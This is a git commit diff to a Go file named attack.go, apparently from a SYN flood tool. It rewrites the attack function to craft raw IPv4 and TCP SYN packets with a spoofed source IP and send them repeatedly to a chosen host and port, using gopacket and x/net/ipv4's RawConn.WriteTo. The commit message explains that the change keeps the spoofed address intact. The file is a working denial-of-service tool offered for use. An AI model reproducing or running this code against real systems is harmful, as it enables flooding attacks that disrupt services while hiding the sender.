c385019d37b48f96489280e92c04093e6bffcc6d
coherentjavi <coherentsheafjavi@proton.me>
2025-09-30 20:03:05 -0600

    Update attack.go
    updated the attack function, src IP value kept being overriden when packet was sent out. 
    
    for this used the WriteTo method for the RawConn type from x/net/ipv4 . this allowed src IP to remain as it was set

--- src/attack.go
+++ src/attack.go
@@ -5,58 +5,82 @@ import (
 	"net"
 
 	"github.com/google/gopacket"
+	"github.com/google/gopacket/examples/util"
 	"github.com/google/gopacket/layers"
+	"golang.org/x/net/ipv4"
 )
 
 func Attack(src string, dstn string, packets int, port int) {
-	// we're going to use gopacket to create custom IP packet headers with a spoofed IP and a simple SYN segment on the transport layer with the TCP protocol
+	defer util.Run()()
 
-	ipHeader := &layers.IPv4{
-		IHL:      5,
-		TTL:      64,
-		Protocol: layers.IPProtocolTCP,
+	// we'll need to set all the fields needed to use the WriteTo method on the RawConn type
+	//https://pkg.go.dev/golang.org/x/net/ipv4#RawConn.WriteTo, this method will allow us manipulate the header & spoof the IP
+	//to get the values manually: one can use netcat to send a simple SYN TCP packet, then review the ip header with tcpdump
+	//we'll use gopacket and only set the fields we care for, serialize it to a buffer so others fields can be filled and parse that header from the buffer
+
+	ipPreHeader := &layers.IPv4{
+		Version:  4,
 		SrcIP:    net.ParseIP(src),
 		DstIP:    net.ParseIP(dstn),
+		TTL:      64,
+		Protocol: layers.IPProtocolTCP,
+	}
+	//seems all TCP fields do need to be filled manually, otherwise returns error: tcp 20 [bad hdr length 0 - too short, < 20]
+	tcpHeader := &layers.TCP{
+		SrcPort: layers.TCPPort(56578),
+		DstPort: layers.TCPPort(port),
+		Seq:     69,
+		SYN:     true,
+		Ack:     0,
+		ACK:     false,
+		FIN:     false,
+		Urgent:  0,
+		RST:     false,
+		URG:     false,
+		ECE:     false,
+		CWR:     false,
+		NS:      false,
+		PSH:     false,
+		Window:  420,
 	}
 
-	tcpHeader := &layers.TCP{
-		DstPort: layers.TCPPort(port),
-		SYN:     true,
+
+	bufIP := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+	tcpHeader.SetNetworkLayerForChecksum(ipPreHeader)
+	err := ipPreHeader.SerializeTo(bufIP, opts)
+	if err != nil {
+		fmt.Println("Couldn't serialize IP header. Error: ", err)
+	}
+	ipHeader, err := ipv4.ParseHeader(bufIP.Bytes())
+	if err != nil {
+		fmt.Println("Couldn't parse from buffer to IP header. Error: ", err)
 	}
 
 	buf := gopacket.NewSerializeBuffer()
-	opts := gopacket.SerializeOptions{
-		ComputeChecksums: true,
-	}
-	tcpHeader.SetNetworkLayerForChecksum(ipHeader)
-
-	err := gopacket.SerializeLayers(buf, opts, ipHeader, tcpHeader)
+	err = gopacket.SerializeLayers(buf, opts, tcpHeader)
 	if err != nil {
-		fmt.Println("Error: ", err)
+		fmt.Println(" Error: ", err)
 	}
 
 	conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
 	if err != nil {
-		fmt.Println("Socket couldn't be created. Error: ", err)
+		fmt.Println(" Error: ", err)
 	}
 
-	dstnAddr := net.IPAddr{
-		IP: net.ParseIP(dstn),
+	rawConn, err := ipv4.NewRawConn(conn)
+	if err != nil {
+		fmt.Println("Error: ", err)
 	}
-
-	countError := 0
 
 	for i := 0; i <= packets; i++ {
-		// the WriteTo method for IPConn returns an int n per docs https://pkg.go.dev/net#IPConn https://pkg.go.dev/net#PacketConn
-		// it's not clear to me what this int is for, however doesn't seem like we'll need it
 
-		_, err := conn.WriteTo(buf.Bytes(), &dstnAddr)
+		err := rawConn.WriteTo(ipHeader, buf.Bytes(), nil)
 		if err != nil {
-			fmt.Println("Couldn't send packet: Error: ", err)
-			countError += 1
-			if countError > 6 {
-				fmt.Println("Too many errors, no more attempts will be made")
-			}
+			fmt.Println("Couldn't send packet. Error: ", err)
 			continue
 		}
 	}
